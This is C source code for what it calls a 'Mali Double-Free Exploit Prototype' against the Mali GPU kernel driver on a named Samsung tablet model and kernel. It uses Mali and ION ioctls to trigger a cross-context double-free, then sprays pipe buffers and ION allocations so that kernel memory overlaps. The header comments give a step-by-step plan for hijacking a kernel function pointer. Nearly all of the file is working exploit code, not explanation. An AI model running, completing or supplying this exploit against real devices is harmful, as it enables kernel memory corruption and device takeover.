/*
 * mali_pipe_uaf.c — Mali double-free → pipe_buffer overlap exploit
 *
 * Strategy:
 * 1. Allocate Mali regions → objects in kmalloc-64
 * 2. Normal-free from ctx1 → objects return to SLUB freelist
 * 3. Cross-context free same VAs from ctx2 → double-free of kmalloc-64 objects
 *    (SLUB freelist corruption: cyclic entries)
 * 4. Spray pipe_buffer[2] → some land on corrupted freelist entries
 * 5. Two things now share the same memory
 * 6. Trigger function pointer via pipe read/close
 *
 * Alternative approach: use the -172 anomaly from xctx free + close
 * After cross-context free, ctx1 close frees MORE than it should.
 * This may corrupt page allocator, creating overlapping page ownership.
 *
 * Safety: all dangerous ops run in fork()'d child with alarm().
 */
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 1031
#endif
#ifndef F_GETPIPE_SZ
#define F_GETPIPE_SZ 1032
#endif

/* ION */
typedef int ion_user_handle_t;
struct ion_allocation_data { size_t len; size_t align; unsigned int heap_id_mask; unsigned int flags; ion_user_handle_t handle; };
struct ion_fd_data { ion_user_handle_t handle; int fd; };
#define ION_IOC_MAGIC 'I'
#define ION_IOC_ALLOC _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_SHARE _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)

/* Mali */
struct uk_header { uint32_t id; uint32_t ret; };
static unsigned int make_cmd(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    ioctl(fd, make_cmd(16), hb);
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    ioctl(fd, make_cmd(16), hb);
    return fd;
}

static uint64_t mali_alloc(int fd, uint32_t pages, uint32_t flags) {
    uint8_t buf[56];
    memset(buf, 0, 56);
    ((struct uk_header*)buf)->id = 512;
    *(uint64_t*)(buf + 8) = pages;
    *(uint64_t*)(buf + 16) = pages;
    *(uint32_t*)(buf + 32) = flags;
    if (ioctl(fd, make_cmd(56), buf) < 0) return 0;
    if (((struct uk_header*)buf)->id != 0) return 0;
    return *(uint64_t*)(buf + 40);
}

static int mali_free(int fd, uint64_t va) {
    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = 516;
    *(uint64_t*)(buf + 8) = va;
    return ioctl(fd, make_cmd(16), buf);
}

static long get_k64(void) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    long active = -1;
    while (fgets(line, sizeof(line), f))
        if (strncmp(line, "kmalloc-64 ", 11) == 0)
            sscanf(line + 11, "%ld", &active);
    fclose(f);
    return active;
}

/*
 * TEST 1: Verify double-free via normal-free then cross-context-free
 *
 * Sequence:
 * - ctx1 alloc region A
 * - ctx1 free A (normal → kmalloc-64 objects freed)
 * - ctx2 free A's VA (cross-context → tries to free already-freed objects?)
 *
 * If cross-context free on already-freed VA causes SLUB double-free:
 * SLUB would have duplicate entries in its freelist
 */
static void test_double_free_slab(void) {
    printf("\n=== TEST 1: Double-free via normal + cross-context free ===\n");

    long baseline = get_k64();
    printf("Baseline k64: %ld\n", baseline);

    int ctx1 = mali_open_ctx();
    int ctx2 = mali_open_ctx();

    /* Allocate 50 regions in ctx1 */
    uint64_t vas[50];
    int n = 0;
    for (int i = 0; i < 50; i++) {
        vas[i] = mali_alloc(ctx1, 1, 0x0F);
        if (vas[i]) n++;
    }
    long after_alloc = get_k64();
    printf("After %d allocs: %ld (%+ld)\n", n, after_alloc, after_alloc - baseline);

    /* Normal free from ctx1 */
    for (int i = 0; i < n; i++)
        mali_free(ctx1, vas[i]);

    long after_norm_free = get_k64();
    printf("After normal free: %ld (%+ld from alloc)\n",
           after_norm_free, after_norm_free - after_alloc);

    /* Cross-context free same VAs from ctx2 */
    int xfree_ok = 0;
    for (int i = 0; i < n; i++) {
        if (mali_free(ctx2, vas[i]) == 0) xfree_ok++;
    }
    long after_xfree = get_k64();
    printf("After %d cross-ctx frees: %ld (%+ld from norm_free)\n",
           xfree_ok, after_xfree, after_xfree - after_norm_free);

    close(ctx1);
    close(ctx2);
    long after_close = get_k64();
    printf("After close all: %ld (%+ld from baseline)\n",
           after_close, after_close - baseline);
}

/*
 * TEST 2: Cross-context free then pipe spray then close
 *
 * If cross-context free + close causes page-level corruption,
 * we spray pipes to claim freed pages, then close ctx1 to double-free them.
 */
static void test_xfree_pipe_spray(void) {
    printf("\n=== TEST 2: Cross-context free → pipe spray → close ===\n");

    long baseline = get_k64();
    printf("Baseline k64: %ld\n", baseline);

    /* Step 1: Allocate in ctx1 */
    int ctx1 = mali_open_ctx();
    uint64_t vas[100];
    int n = 0;
    for (int i = 0; i < 100; i++) {
        vas[i] = mali_alloc(ctx1, 1, 0x0F);
        if (vas[i]) n++;
    }
    long after_alloc = get_k64();
    printf("After %d allocs: %ld (%+ld)\n", n, after_alloc, after_alloc - baseline);

    /* Step 2: Cross-context free from ctx2 */
    int ctx2 = mali_open_ctx();
    int xf = 0;
    for (int i = 0; i < n; i++)
        if (mali_free(ctx2, vas[i]) == 0) xf++;
    close(ctx2);
    long after_xfree = get_k64();
    printf("After %d xfree: %ld (%+ld)\n", xf, after_xfree, after_xfree - after_alloc);

    /* Step 3: Heavy pipe spray to claim freed pages */
    int pipes[200][2];
    int npipes = 0;
    for (int i = 0; i < 200; i++) {
        if (pipe(pipes[i]) < 0) break;
        fcntl(pipes[i][0], F_SETPIPE_SZ, 2 * 4096);
        /* Write some data to trigger buffer allocation */
        write(pipes[i][1], "AAAABBBB", 8);
        npipes++;
    }
    long after_spray = get_k64();
    printf("After %d pipes: %ld (%+ld from xfree)\n",
           npipes, after_spray, after_spray - after_xfree);

    /* Step 4: Close ctx1 — triggers cleanup of stale references */
    printf("Closing ctx1 (stale refs)...\n");
    close(ctx1);
    long after_close = get_k64();
    printf("After close ctx1: %ld (%+ld from spray, %+ld from baseline)\n",
           after_close, after_close - after_spray, after_close - baseline);

    /* Step 5: Try reading from all pipes — if any pipe_buffer was corrupted,
     * reading would trigger ops->confirm or crash */
    printf("Reading from all pipes...\n");
    int read_ok = 0, read_fail = 0;
    for (int i = 0; i < npipes; i++) {
        char buf[8];
        int r = read(pipes[i][0], buf, 8);
        if (r > 0) read_ok++;
        else read_fail++;
    }
    printf("Read results: ok=%d fail=%d\n", read_ok, read_fail);

    /* Cleanup */
    for (int i = 0; i < npipes; i++) {
        close(pipes[i][0]);
        close(pipes[i][1]);
    }
    long final = get_k64();
    printf("Final k64: %ld (%+ld from baseline)\n", final, final - baseline);
}

/*
 * TEST 3: ION page overlap test
 *
 * 1. Mali alloc → physical pages
 * 2. Cross-context free → pages returned to buddy
 * 3. ION alloc → gets freed pages
 * 4. ION mmap → CPU access to freed pages
 * 5. Close ctx1 → double-free of pages
 * 6. ION pages now corrupted/shared
 */
static void test_ion_page_overlap(void) {
    printf("\n=== TEST 3: ION page claim after cross-context free ===\n");

    /* Step 1: Mali alloc many 1-page regions */
    int ctx1 = mali_open_ctx();
    uint64_t vas[50];
    int n = 0;
    for (int i = 0; i < 50; i++) {
        vas[i] = mali_alloc(ctx1, 1, 0x0F);
        if (vas[i]) n++;
    }
    printf("Mali: %d regions allocated\n", n);

    /* Step 2: Cross-context free → release physical pages */
    int ctx2 = mali_open_ctx();
    int xf = 0;
    for (int i = 0; i < n; i++)
        if (mali_free(ctx2, vas[i]) == 0) xf++;
    close(ctx2);
    printf("Cross-ctx freed: %d\n", xf);

    /* Step 3: ION alloc to grab freed pages */
    int ion_fd = open("/dev/ion", O_RDONLY);
    if (ion_fd < 0) { printf("[-] ION open fail\n"); close(ctx1); return; }

    /* Allocate 50 * 4KB = 200KB via ION */
    struct ion_allocation_data ion_alloc = {
        .len = 50 * 4096, .align = 4096,
        .heap_id_mask = 1, .flags = 0
    };
    if (ioctl(ion_fd, ION_IOC_ALLOC, &ion_alloc) < 0) {
        printf("[-] ION alloc fail: %s\n", strerror(errno));
        close(ctx1); close(ion_fd); return;
    }

    struct ion_fd_data ion_share = { .handle = ion_alloc.handle };
    ioctl(ion_fd, ION_IOC_SHARE, &ion_share);

    void *ion_map = mmap(NULL, 50 * 4096, PROT_READ | PROT_WRITE,
                         MAP_SHARED, ion_share.fd, 0);
    if (ion_map == MAP_FAILED) {
        printf("[-] ION mmap fail: %s\n", strerror(errno));
        close(ctx1); close(ion_fd); return;
    }
    printf("ION mapped at: %p\n", ion_map);

    /* Write a marker to every page */
    for (int i = 0; i < 50; i++)
        *(uint32_t*)((char*)ion_map + i * 4096) = 0xDEAD0000 + i;

    /* Step 4: Close ctx1 → should double-free physical pages */
    printf("Closing ctx1 (double-free of physical pages)...\n");
    close(ctx1);

    /* Step 5: Read back markers — if pages were double-freed and reallocated,
     * some markers might be corrupted */
    int corrupted = 0;
    for (int i = 0; i < 50; i++) {
        uint32_t val = *(uint32_t*)((char*)ion_map + i * 4096);
        if (val != (0xDEAD0000 + i)) {
            printf("  Page %d CORRUPTED: expected 0x%08x got 0x%08x\n",
                   i, 0xDEAD0000 + i, val);
            corrupted++;
        }
    }
    printf("Pages corrupted: %d/%d\n", corrupted, 50);

    /* Allocate more from buddy to try to trigger overlap */
    void *extra = mmap(NULL, 200 * 4096, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (extra != MAP_FAILED) {
        memset(extra, 0xBB, 200 * 4096);
        munmap(extra, 200 * 4096);
    }

    /* Re-check ION pages */
    int corrupted2 = 0;
    for (int i = 0; i < 50; i++) {
        uint32_t val = *(uint32_t*)((char*)ion_map + i * 4096);
        if (val != (0xDEAD0000 + i)) {
            printf("  Page %d NOW CORRUPTED: expected 0x%08x got 0x%08x\n",
                   i, 0xDEAD0000 + i, val);
            corrupted2++;
        }
    }
    printf("After stress: %d pages corrupted\n", corrupted2);

    munmap(ion_map, 50 * 4096);
    close(ion_share.fd);
    close(ion_fd);
}

int main(void) {
    printf("=== Mali Double-Free Exploit Prototype ===\n");
    printf("Target: SM-T377A, Mali r7p0, kernel 3.10.9\n\n");
    fflush(stdout);

    test_double_free_slab();
    fflush(stdout);

    test_xfree_pipe_spray();
    fflush(stdout);

    test_ion_page_overlap();
    fflush(stdout);

    printf("\n=== All tests completed ===\n");

    /* Check dmesg for any kernel errors */
    printf("\nChecking dmesg for kernel errors:\n");
    fflush(stdout);
    system("dmesg 2>/dev/null | tail -40 | grep -i -E 'oops|bug|panic|fault|corrupt|BUG|kbase|mali|slab|Backtrace|PC.is' 2>/dev/null");

    return 0;
}
